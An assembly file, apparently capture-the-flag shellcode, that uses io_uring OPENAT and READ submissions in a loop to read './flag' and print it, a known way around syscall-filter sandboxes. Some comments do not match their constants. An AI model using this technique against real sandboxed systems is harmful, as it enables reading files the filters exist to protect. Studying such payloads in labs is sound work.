section .text
global _start

_start:
    ; mmap
    mov rax, 0x9
    mov rdi, 0
    mov rsi, 0x2000
    mov rdx, 0x3          ; PROT_READ | PROT_WRITE
    mov r10, 0x21         ; MAP_SHARED | MAP_ANONYMOUS
    mov r8, -1
    mov r9, 0
    syscall

    mov [sq_off_user_addr], rax
    lea r13, [rax + 0x1000]
    mov [cq_off_user_addr], r13

    ; io_uring_setup
    mov rax, 0x1a9
    mov rdi, 2
    lea rsi, [io_uring_params]
    syscall
    mov r12, rax

    ; io_uring_register
    mov rax, 0x1ab
    mov rdi, r12
    mov rsi, 0x80000002   ; IORING_REGISTER_FILES | IORING_REGISTER_USE_REGISTERED_RING
    lea rdx, [fd_arr]
    mov r10, 1
    syscall

    mov dword [rsp+0x10], 0
l:
    inc dword [rsp+0x10]
    ; Prepare SQE for IORING_OP_OPENAT
    mov rbx, [sq_off_user_addr]
    mov byte [rbx], 18    ; opcode = IORING_OP_OPENAT
    mov dword [rbx + 4], -100 ; fd = AT_FDCWD
    lea rax, [path_flag]
    mov [rbx + 16], rax  ; addr
    mov dword [rbx + 28], 0x800 ; open_flags = O_RDONLY | O_NONBLOCK
    mov dword [rbx + 44], 1    ; file_index

    ; Prepare SQE for IORING_OP_READ
    lea rbx, [64 + rbx]
    mov byte [rbx], 22    ; opcode = IORING_OP_READ
    mov byte [rbx + 1], 1 ; flags = IOSQE_FIXED_FILE
    mov dword [rbx + 4], 0  ; fd
    lea rax, [buf]
    mov [rbx + 16], rax  ; addr
    mov dword [rbx + 24], 128 ; len

    ; Submit SQE
    mov eax, [sq_off_array]
    mov rbx, r13
    add rbx, rax
    mov dword [rbx], 0
    mov dword [rbx + 4], 1

    mov eax, [sq_off_tail]
    mov rbx, r13
    add rbx, rax
    mov dword [rbx], 1

    ; io_uring_enter
    mov rax, 0x1aa
    mov rdi, r12
    mov rsi, 1
    mov rdx, 1
    mov r10, 0x11   ; IORING_ENTER_GETEVENTS | IORING_ENTER_REGISTERED_RING
    syscall

    ; io_uring_enter (second call)
    mov dword [rbx], 0

    mov rax, 0x1aa
    mov rdi, r12
    mov rsi, 1
    mov rdx, 1
    mov r10, 0x11   ; IORING_ENTER_GETEVENTS | IORING_ENTER_REGISTERED_RING
    syscall
    cmp dword [rsp+0x10], 100
    jne l

   

    ; write buffer to stdout
    mov rax, 1
    mov rdi, 1
    lea rsi, [buf]
    mov rdx, 128
    syscall

section .data
area_ptr:
    dq 0

io_uring_params:
    dd 0                  ; sq_entries
    dd 0                  ; cq_entries
    dd 0xc000              ; flags = IORING_SETUP_REGISTERED_FD_ONLY | IORING_SETUP_NO_MMAP
    dd 0                  ; sq_thread_cpu
    dd 0                  ; sq_thread_idle
    dd 0                  ; features
    dd 0                  ; wq_fd
    dd 0                  ; resv[0]
    dd 0                  ; resv[1]
    dd 0                  ; resv[2]
    dd 0                  ; sq_off.head
sq_off_tail:
    dd 0                  ; sq_off.tail
    dd 0                  ; sq_off.ring_mask
    dd 0                  ; sq_off.ring_entries
    dd 0                  ; sq_off.flags
    dd 0                  ; sq_off.dropped
sq_off_array:
    dd 0                  ; sq_off.array
    dd 0                  ; sq_off.resv1
sq_off_user_addr:
    dq 0                  ; sq_off.user_addr
    dd 0                  ; cq_off.head
    dd 0                  ; cq_off.tail
    dd 0                  ; cq_off.ring_mask
    dd 0                  ; cq_off.ring_entries
    dd 0                  ; cq_off.overflow
    dd 0                  ; cq_off.cqes
    dd 0                  ; cq_off.flags
    dd 0                  ; cq_off.resv1
cq_off_user_addr:
    dq 0                  ; cq_off.user_addr

fd_arr:
    dd -1

path_flag:
    db "./flag", 0

buf:
    times 128 db 0
